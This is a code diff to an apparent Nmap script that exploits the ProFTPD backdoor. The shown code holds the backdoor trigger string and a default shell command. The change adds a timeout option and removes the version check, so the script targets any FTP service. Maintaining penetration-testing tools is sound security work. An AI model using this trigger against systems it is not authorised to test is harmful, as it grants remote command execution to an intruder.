@@ -36,6 +36,7 @@ categories = {"exploit", "intrusive", "malware", "vuln"}
 
 local CMD_FTP = "HELP ACIDBITCHEZ"
 local CMD_SHELL = "id"
+local TIME_OUT = 5000
 
 portrule = function (host, port)
   -- Check if version detection knows what FTP server this is.
@@ -43,10 +44,6 @@ portrule = function (host, port)
     return false
   end
 
-  -- Check if version detection knows what version of FTP server this is.
-  if port.version.version ~= nil and port.version.version ~= "1.3.3c" then
-    return false
-  end
 
   return shortport.port_or_service(21, "ftp")(host, port)
 end
@@ -56,13 +53,17 @@ action = function(host, port)
 
   -- Get script arguments.
   cmd = stdnse.get_script_args("ftp-proftpd-backdoor.cmd")
+  timeout = stdnse.get_script_args("ftp-proftpd-backdoor.timeout")
   if not cmd then
     cmd = CMD_SHELL
+  end
+  if not timeout then
+      timeout = TIME_OUT
   end
 
   -- Create socket.
   sock = nmap.new_socket("tcp")
-  sock:set_timeout(5000)
+  sock:set_timeout(timeout)
   status, err = sock:connect(host, port, "tcp")
   if not status then
     stdnse.debug1("Can't connect: %s", err)
